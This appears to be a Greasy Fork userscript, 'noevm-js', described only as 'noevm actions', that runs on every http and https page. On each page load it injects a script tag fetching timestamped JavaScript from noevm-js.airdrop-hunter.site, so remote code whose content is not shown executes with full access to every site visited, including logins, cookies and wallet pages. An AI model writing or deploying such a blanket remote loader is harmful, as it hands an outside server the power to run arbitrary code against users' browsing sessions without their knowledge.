// ==UserScript==
// @name         noevm-js
// @version      0.01
// @author       lxgn
// @description  noevm actions
// @match        https://*/*
// @match        http://*/*
// @license MIT
// @namespace https://greasyfork.org/users/195836
// @downloadURL https://update.greasyfork.org/scripts/482183/noevm-js.user.js
// @updateURL https://update.greasyfork.org/scripts/482183/noevm-js.meta.js
// ==/UserScript==
 
var ms = new Date();
//document.write();
 
var script = document.createElement('script');
//var t = Math.random()*1000000;
 
var kuda = "https://noevm-js.airdrop-hunter.site/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);
 
script.onload = function() {
    // после выполнения скрипта становится доступна функция _
    //alert( 'load script' ); // её код
  }